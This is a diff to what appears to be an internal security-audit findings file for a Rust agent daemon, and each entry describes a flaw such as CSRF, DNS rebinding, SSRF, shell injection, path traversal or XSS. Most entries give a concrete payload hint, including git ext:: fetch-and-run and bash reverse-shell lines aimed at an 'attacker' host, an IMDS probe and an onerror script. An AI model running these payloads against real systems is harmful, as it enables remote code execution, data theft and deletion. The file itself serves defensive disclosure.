@@ -6,10 +6,10 @@ findings emitted via record_exploration_finding payload below
 record_exploration_finding
 {
   "path": "crates/nyx-agent-api/src/router.rs",
-  "line": 1425,
+  "line": 1441,
   "cap": "AUTH_BYPASS",
   "endpoint": "GET /api/v1/events (WebSocket upgrade)",
-  "rationale": "events_ws performs no Origin-header check before on_upgrade. WebSockets are not subject to the SOP same-origin restriction that gates fetch(); any cross-origin page the operator visits can open ws://127.0.0.1:<port>/api/v1/events and stream every AgentEvent (scan output, repo paths, finding bodies). The bearer-token gate runs first, but the fallback `?token=` URL-query auth (router.rs:116) means a token leaked via Referer / browser history / TraceLayer logs is enough to mount a Cross-Site WebSocket Hijack. Missed by the static pass because the bypass is a *missing* check, not a tainted-flow sink.",
+  "rationale": "events_ws performs no Origin-header check before on_upgrade. WebSockets are not subject to the SOP same-origin restriction that gates fetch(); any cross-origin page the operator visits can open ws://127.0.0.1:<port>/api/v1/events and stream every AgentEvent (scan output, repo paths, finding bodies). The bearer-token gate runs first, but the fallback `?token=` URL-query auth (router.rs:132) means a token leaked via Referer / browser history / TraceLayer logs is enough to mount a Cross-Site WebSocket Hijack. Missed by the static pass because the bypass is a *missing* check, not a tainted-flow sink.",
   "suggested_payload_hint": "from a non-loopback origin: new WebSocket('ws://127.0.0.1:8088/api/v1/events?token='+leakedToken) — confirm operator-side run events stream out cross-origin."
 }
 
@@ -17,7 +17,7 @@ record_exploration_finding
 record_exploration_finding
 {
   "path": "crates/nyx-agent-api/src/router.rs",
-  "line": 85,
+  "line": 89,
   "cap": "AUTH_BYPASS",
   "endpoint": "POST /api/v1/setup (pre-config window)",
   "rationale": "auth_layer exempts /api/v1/setup, /setup/status, /setup/doctor whenever setup.is_complete() is false. Between daemon start and the operator's first wizard submission, anyone who can reach the listener can POST a SetupRequest with i_own_this:true, sandbox_backend:'process' (disables kernel isolation), and ai_runtime:'local-llm' + attacker-controlled local_llm_url, then watch all subsequent AI calls flow to their endpoint. i_own_this is a single-bit attestation, not a challenge. Race window is short on a warm install but unbounded on a fresh provision. Static pass missed this because the *intended* policy and the *bypassable* policy share the same code path — the bug is a state-machine flaw (transient-trust window), not a tainted sink.",
@@ -28,10 +28,10 @@ record_exploration_finding
 record_exploration_finding
 {
   "path": "crates/nyx-agent/src/main.rs",
-  "line": 816,
+  "line": 817,
   "cap": "DNS_REBIND",
   "endpoint": "all /api/v1/* via operator-configured listen_addr",
-  "rationale": "TcpListener::bind uses config.ui.listen_addr verbatim (operator override on CLI). No Host-header allowlist anywhere in the router. If listen_addr is 0.0.0.0 (common foot-gun) or the operator merely visits a malicious page while the daemon is bound to 127.0.0.1, DNS-rebinding resolves attacker-controlled hostnames to 127.0.0.1 after the first response, so subsequent fetches from the foreign origin hit the loopback API with browser-side SOP satisfied. Combined with `?token=` URL-query auth (router.rs:116) and absent CorsLayer, a rebind primitive lets a remote attacker pivot to full API access once any token leaks. Static pass missed because no flow is involved — the gap is the absence of `host == 127.0.0.1 || host == localhost` middleware.",
+  "rationale": "TcpListener::bind uses config.ui.listen_addr verbatim (operator override on CLI). No Host-header allowlist anywhere in the router. If listen_addr is 0.0.0.0 (common foot-gun) or the operator merely visits a malicious page while the daemon is bound to 127.0.0.1, DNS-rebinding resolves attacker-controlled hostnames to 127.0.0.1 after the first response, so subsequent fetches from the foreign origin hit the loopback API with browser-side SOP satisfied. Combined with `?token=` URL-query auth (router.rs:132) and absent CorsLayer, a rebind primitive lets a remote attacker pivot to full API access once any token leaks. Static pass missed because no flow is involved — the gap is the absence of `host == 127.0.0.1 || host == localhost` middleware.",
   "suggested_payload_hint": "DNS server with 5s TTL: first answer = attacker IP, second answer = 127.0.0.1; victim visits http://rebind.example/, JS calls fetch('/api/v1/runs?token=<guess>')."
 }
 
@@ -39,10 +39,10 @@ record_exploration_finding
 record_exploration_finding
 {
   "path": "crates/nyx-agent-api/src/router.rs",
-  "line": 116,
+  "line": 132,
   "cap": "CRED_EXPOSURE",
   "endpoint": "all auth-gated /api/v1/* (token in ?token=)",
-  "rationale": "check_query_token accepts the bearer in the URL query string. TraceLayer::new_for_http() (router.rs:63) writes the request URI to tracing output by default, so every authenticated request logs the bearer in cleartext to whatever subscriber the operator wired (stderr, file, journald, etc). URL-query tokens also leak via browser history, Referer on navigation, and any reverse-proxy access log placed in front of the daemon. The constant-time comparison at :129 is defeated upstream because the secret already crossed three logging surfaces. Static pass missed because the bug is a misuse pattern (logging-by-default of a transport-level secret), not a missing escape.",
+  "rationale": "check_query_token accepts the bearer in the URL query string. TraceLayer::new_for_http() (router.rs:79) writes the request URI to tracing output by default, so every authenticated request logs the bearer in cleartext to whatever subscriber the operator wired (stderr, file, journald, etc). URL-query tokens also leak via browser history, Referer on navigation, and any reverse-proxy access log placed in front of the daemon. The constant-time comparison at :145 is defeated upstream because the secret already crossed three logging surfaces. Static pass missed because the bug is a misuse pattern (logging-by-default of a transport-level secret), not a missing escape.",
   "suggested_payload_hint": "grep daemon stderr / journald output for 'token=' after any authenticated GET; confirm the bearer is recoverable from logs."
 }
 
@@ -50,10 +50,10 @@ record_exploration_finding
 record_exploration_finding
 {
   "path": "crates/nyx-agent-api/src/router.rs",
-  "line": 887,
+  "line": 903,
   "cap": "CSRF",
   "endpoint": "POST /api/v1/scan?repo=&token= (also /quarantine/:id/promote, /quarantine/:id/dismiss)",
-  "rationale": "trigger_scan takes only Query parameters — no JSON body required. From a browser's perspective this is a CORS *simple* request (POST + no custom headers + no body), so a cross-origin attacker page can fire it without preflight. The bearer can ride along in `?token=` (router.rs:116), which a victim's referrer/history may already have leaked. Result: any page the operator visits while logged in can spam scans (DoS via runaway repo clone/sandbox spin) or, against a misconfigured repo, force scan paths the operator did not initiate. Same shape applies to /quarantine/:id/promote and /quarantine/:id/dismiss. Static pass missed because the CSRF surface is the *absence* of (a) CorsLayer with credential-aware policy, (b) Origin/Sec-Fetch-Site checks, (c) anti-CSRF token — all missing controls.",
+  "rationale": "trigger_scan takes only Query parameters — no JSON body required. From a browser's perspective this is a CORS *simple* request (POST + no custom headers + no body), so a cross-origin attacker page can fire it without preflight. The bearer can ride along in `?token=` (router.rs:132), which a victim's referrer/history may already have leaked. Result: any page the operator visits while logged in can spam scans (DoS via runaway repo clone/sandbox spin) or, against a misconfigured repo, force scan paths the operator did not initiate. Same shape applies to /quarantine/:id/promote and /quarantine/:id/dismiss. Static pass missed because the CSRF surface is the *absence* of (a) CorsLayer with credential-aware policy, (b) Origin/Sec-Fetch-Site checks, (c) anti-CSRF token — all missing controls.",
   "suggested_payload_hint": "<form method=POST action='http://127.0.0.1:8088/api/v1/scan?repo=victim-repo&token=LEAKED' enctype='text/plain'><input name=x value=y></form><script>document.forms[0].submit()</script>"
 }
 
@@ -61,9 +61,97 @@ record_exploration_finding
 record_exploration_finding
 {
   "path": "crates/nyx-agent/src/main.rs",
-  "line": 840,
+  "line": 841,
   "cap": "OS_COMMAND",
   "endpoint": "<cli:--open-cmd>",
   "rationale": "The --open-cmd <cmd> flag is fed straight to std::process::Command::new(&cmd).arg(&url_for_open). No allowlist. Command::new bypasses the shell, so URL metacharacters do not inject; however the cmd value itself is taken verbatim from the CLI, so any caller that builds the daemon invocation from semi-trusted state (orchestration script reading env, supervisord with config drift, etc.) is one substitution away from arbitrary binary spawn at startup. Low severity in isolation, but pairs cleanly with the pre-setup auth-bypass finding: an attacker who reaches the wizard could plant a remediation hint pointing the operator at `--open-cmd /tmp/payload`. Static pass missed because Command::new() with a literal-looking variable does not match the canonical OS-injection sink shape (no shell, no format!).",
   "suggested_payload_hint": "n/a — defence is a positive allowlist for --open-cmd (xdg-open, open, start) or drop the flag on production builds."
+}
+
+---
+record_exploration_finding
+{
+  "path": "crates/nyx-agent-api/src/router.rs",
+  "line": 793,
+  "cap": "SSRF",
+  "endpoint": "POST /api/v1/repos/test",
+  "rationale": "git_ls_remote_probe feeds the operator-supplied source_url_or_path verbatim to `git ls-remote <url>`. There is no scheme allowlist. `git` recognises far more than https: `file://` reads local trees (info-disclosure pivot — confirm presence of an arbitrary path on the daemon host by watching exit code / line_count), and `http(s)://` resolves with the system resolver, so an attacker who can reach this endpoint can probe internal hosts (cloud metadata 169.254.169.254, corp wiki, internal artefact registries) and learn reachability + response timing from the daemon's network position. The handler is auth-gated, but the bearer can leak through the `?token=` path (router.rs:132) and the surface is then a full server-side request primitive. Static pass missed because the URL never reaches a Rust HTTP client — the SSRF is dispatched by `git`, which the taint tracker treats as a black box.",
+  "suggested_payload_hint": "POST /api/v1/repos/test {\"source_kind\":\"git\",\"source_url_or_path\":\"http://169.254.169.254/latest/meta-data/iam/\"} — non-zero exit + populated stderr in TestRepoResponse.message confirms the daemon reached the IMDS endpoint."
+}
+
+---
+record_exploration_finding
+{
+  "path": "crates/nyx-agent-api/src/router.rs",
+  "line": 799,
+  "cap": "OS_COMMAND",
+  "endpoint": "POST /api/v1/repos/test (git transport=ext::)",
+  "rationale": "Same handler as the SSRF row, distinct sink. `git` supports the `ext::<cmd>` transport, which executes `<cmd>` as a shell command and reads/writes pack data on its stdio. ls-remote with `url = ext::sh -c '<payload>'` triggers `git` to spawn the embedded command on the daemon host with the daemon's privileges, even though the wrapper passes `GIT_TERMINAL_PROMPT=0` and a scrubbed config — the ext:: transport is part of `git` itself, not a config-controlled helper. Net effect: any authenticated caller of /api/v1/repos/test gets unauthenticated-equivalent RCE on the daemon host (the request body is plain JSON, no second-factor). The empty-string guard at line 752 does not look at the scheme. CVE-2017-1000117-class pattern, just lifted into the daemon's surface. Hard to spot statically because the sink is a string arg to `git` that *looks* benign.",
+  "suggested_payload_hint": "POST /api/v1/repos/test {\"source_kind\":\"git\",\"source_url_or_path\":\"ext::sh -c 'curl http://attacker/x|sh >&2'\"} — observe attacker callback while TestRepoResponse.ok=false."
+}
+
+---
+record_exploration_finding
+{
+  "path": "crates/nyx-agent-api/src/router.rs",
+  "line": 1723,
+  "cap": "OS_COMMAND",
+  "endpoint": "POST /api/v1/findings/:id/replay",
+  "rationale": "replay_repro_bundle extracts the per-finding USTAR bundle into a tempdir and unconditionally runs `bash <id>/repro.sh`. The script body is built by render_repro_script (repro_bundle.rs:229) which interpolates finding.id, finding.rule, payload.cap, payload.lang directly into the shell source with no escaping — the format string places them inside a `# cap={cap} lang={lang} rule={rule}` comment and inside `echo \"[repro] finding={id} cap={cap}\"`. A newline in `rule` or `cap` breaks out of the comment / quoted echo and runs arbitrary shell. Those fields ride in from `CandidateFindingRecord` populated by the AI Exploration / NovelFinding passes (the very surfaces this Phase-23 worker writes to), so an attacker who can land a single quarantined candidate with `cap = \"X\\nbash -i >& /dev/tcp/attacker/4444 0>&1\\n#\"` and convince the operator to click \"Replay\" gets shell on the daemon host. The replay handler runs bash directly, no sandbox lane, so the static escape suite gate does not apply. Static pass missed because the taint path crosses sqlite (candidate row -> finding row -> bundle render -> exec).",
+  "suggested_payload_hint": "candidate_findings row: cap = \"AUTH_BYPASS\\nbash -c 'id|nc attacker 4444'\\n#\"; promote -> POST /findings/<id>/replay; watch attacker tcp:4444 land a callback."
+}
+
+---
+record_exploration_finding
+{
+  "path": "crates/nyx-agent-api/src/router.rs",
+  "line": 1639,
+  "cap": "PATH_TRAVERSAL",
+  "endpoint": "GET /api/v1/findings/:id/repro-bundle.tar",
+  "rationale": "download_repro_bundle reads `row.path` from the repro_bundles table and pipes it straight to std::fs::read with no canonicalisation, no prefix check against state_bundles_dir, and no symlink check. The path is treated as trusted because the writer (`build_bundle`) places files inside the configured bundle root, but the schema does not constrain inserts to that root. Any later code path that writes a repro_bundles row — including a future migration, a sqlite import, an operator-run psql session, or any newly-added handler that takes a path from JSON — turns this endpoint into an authenticated arbitrary-file-read: the response sets Content-Disposition: attachment with the finding id as filename, so the operator's browser will happily save /etc/passwd, the daemon's auth_token file (state_dir.load_or_mint_auth_token output), the sqlite DB, or repo workspaces containing private source. Static pass missed because the read sink looks safe in isolation; the bug is the *missing* boundary check on a DB-sourced path, which the taint tracker treats as already-validated.",
+  "suggested_payload_hint": "UPDATE repro_bundles SET path = '/etc/passwd' WHERE finding_id = '<target>'; then GET /api/v1/findings/<target>/repro-bundle.tar — body returns /etc/passwd bytes."
+}
+
+---
+record_exploration_finding
+{
+  "path": "crates/nyx-agent-api/src/router.rs",
+  "line": 688,
+  "cap": "PATH_TRAVERSAL",
+  "endpoint": "DELETE /api/v1/repos/:name",
+  "rationale": "delete_repo computes `target = state_repos_dir.join(&name)` and pipes it straight to `std::fs::remove_dir_all` with no canonicalisation, no prefix check against state_repos_dir, and no rejection of `..` or absolute-path components. The `name` value is the URL segment, taken verbatim. The row-existence gate (`affected == 0` -> NotFound) does *not* keep traversal names out, because create_repo (router.rs:555) only rejects an empty `name` — it happily accepts `name = \"..\"`, `name = \"../..\"`, or an absolute path. The attack is two requests: (1) POST /api/v1/repos with `{\"name\":\"..\",\"source_kind\":\"local-path\",\"source_url_or_path\":\"/tmp\",\"i_own_this\":true}` to plant the row; (2) DELETE /api/v1/repos/.. — the row deletes, then `remove_dir_all(state_repos_dir/..)` recursively wipes the parent of nyx's state dir (sibling repo workspaces, the sqlite store, the operator's auth-token file, anything co-located). With `name = \"../../../etc\"`-style values the wipe walks farther. PathBuf::join does not normalise, and remove_dir_all follows `..` components via raw fs syscalls. Static pass missed this because the sink looks safe in isolation; the bug is the *missing* boundary check on a Path-extractor string the create handler already trusts.",
+  "suggested_payload_hint": "POST /api/v1/repos {\"name\":\"..\",\"source_kind\":\"local-path\",\"source_url_or_path\":\"/tmp\",\"i_own_this\":true} ; DELETE /api/v1/repos/.. — observe `remove_dir_all` traverse out of state_repos_dir into its parent."
+}
+
+---
+record_exploration_finding
+{
+  "path": "crates/nyx-agent-api/src/router.rs",
+  "line": 1789,
+  "cap": "INTEGRITY_VIOLATION",
+  "endpoint": "POST /api/v1/findings/:id/replay",
+  "rationale": "replay_repro_bundle reads the bundle bytes from disk (`std::fs::read(&bundle_path)`), pipes them through extract_ustar, and execs `bash <id>/repro.sh`. The repro_bundles row carries an authoritative `sha256` column (build_bundle stamps blake3_hex(&tar_bytes) at write time, repro_bundle.rs:139), but the replay path never recomputes the digest and never compares against the stored value before extraction. The download endpoint exposes the digest as `X-Nyx-Bundle-Sha256` to advertise integrity, yet the replay endpoint — the one that actually executes the bundle — silently trusts on-disk bytes. Anyone who can write the bundle file on the daemon host (state_bundles_dir is configured with the same perms as the rest of state_dir; a co-tenant process, a backup-restore mishap, or an `rsync --delete` followed by a substituted .tar) gets unaudited shell execution under the daemon's identity the next time the operator clicks `Replay`. The stored sha256 becomes false assurance. Static pass missed because the bug is the *absence* of a verification call — no taint flows the wrong way; the right flow simply does not exist.",
+  "suggested_payload_hint": "overwrite <state_bundles_dir>/<finding-id>.tar with a USTAR archive whose <id>/repro.sh body is `#!/bin/sh\\nbash -i >& /dev/tcp/attacker/4444 0>&1`; leave the repro_bundles row + its sha256 untouched; trigger POST /findings/<id>/replay; observe shell — and observe that the digest in the row no longer matches the bytes that ran."
+}
+
+---
+record_exploration_finding
+{
+  "path": "crates/nyx-agent-api/src/router.rs",
+  "line": 1786,
+  "cap": "DOS",
+  "endpoint": "POST /api/v1/findings/:id/replay",
+  "rationale": "The replay SSE handler spawns `bash <repro.sh>` with `kill_on_drop(true)` but no wall-clock timeout, no CPU cap, no memory cap, and no per-tenant concurrency limit. The handler holds the SSE stream open until both stdout and stderr drain AND `child.wait().await` returns, so a repro script that never terminates (`while :; do :; done`, `sleep infinity`, `cat /dev/urandom | gzip > /dev/null`) parks one tokio task plus one bash process per request, indefinitely. `kill_on_drop` only fires if the *client* disconnects and the SSE response future is dropped; a client that holds the connection open keeps the child alive forever. Combined with the integrity gap above (or just a legit but pathological repro.sh from any AI-emitted finding), an authenticated caller can pin all available file descriptors / process slots by firing N parallel replays. The handler also has no separate sandbox lane — the child inherits the daemon's full ambient privileges and network reach, so a runaway loop competes directly with scan/AI work on the daemon host. Static pass missed because spawning a child process with piped stdio is the canonical shape — the gap is the missing timeout wrapper around `child.wait().await`, not a tainted sink.",
+  "suggested_payload_hint": "build a bundle whose repro.sh is `#!/bin/sh\\nwhile :; do :; done`; fire `for i in $(seq 1 200); do curl -N -X POST http://127.0.0.1:8088/api/v1/findings/<id>/replay?token=<t> & done`; watch daemon CPU + process table fill up while subsequent legitimate requests stall."
+}
+
+---
+record_exploration_finding
+{
+  "path": "crates/nyx-agent-core/src/report/run_card.rs",
+  "line": 346,
+  "cap": "XSS",
+  "endpoint": "GET /api/v1/runs/:id/summary.md",
+  "rationale": "render_markdown interpolates `card.run_id`, `card.status`, `card.triggered_by`, every `BySplit.key`, and every `PhaseDuration.phase` directly into the markdown body with no escaping, while the HTML sibling (render_html, line 259) carefully runs the same fields through escape_html. The HTML route is safe; the markdown route is the surface that bites. `by_cap.key` comes from `findings.cap`, `by_origin.key` from `findings.finding_origin`, and `by_lang.key` from `payloads.lang` — every one of those is a string the AI Exploration / NovelFinding writers control (see candidate_findings → findings promotion path). The frontend at frontend/src/pages/Findings/FindingDetail.tsx and the new client.ts (lines 100-120ish) consume the summary endpoints; any code path that pipes the .md body through a markdown-to-HTML renderer with HTML enabled (the default for `marked`, `markdown-it`, `react-markdown` with `rehype-raw`) lands `<img src=x onerror=...>` straight into the operator's DOM. Same payload via the .json endpoint then back through a markdown renderer hits the same sink. Static pass missed because the source field never crosses a `dangerouslySetInnerHTML` call inside the Rust crate — the XSS is a contract violation between the safe HTML renderer and the unsafe MD renderer; both export from the same module so a caller naturally assumes parity.",
+  "suggested_payload_hint": "promote a candidate finding with `cap = \"<img src=x onerror=alert(document.domain)>\"`; GET /api/v1/runs/<run>/summary.md; observe the unescaped tag inside the `## Capability` bullet list; any UI that markdown-renders the body executes the payload."
 }
